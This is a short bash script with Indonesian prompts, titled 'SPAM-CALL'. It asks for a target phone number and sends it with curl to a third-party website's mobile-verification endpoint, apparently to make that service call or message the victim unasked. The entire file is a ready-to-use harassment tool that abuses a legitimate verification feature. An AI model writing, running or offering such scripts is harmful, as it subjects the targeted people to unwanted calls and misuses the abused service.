#!/bin/bash

sleep 1
echo "==========================================================="
echo
sleep 1
	figlet SPAM-CALL
echo
sleep 1
	toilet -f mini -F gay by The Rebo
echo
sleep 1
echo "==========================================================="
sleep 1
echo
sleep 1
	echo "[*] Contoh 81234567890"
sleep 1
echo

read -p "Nomor Target : " no;
curl -s https://id.jagreward.com/member/verify-mobile/$no/ > /dev/null 2>&1

if [ $? -eq 0 ]; then
echo
echo "[✓] Done Bang"
else
echo
echo "[!] Isinya Yang Bener Bang"
fi
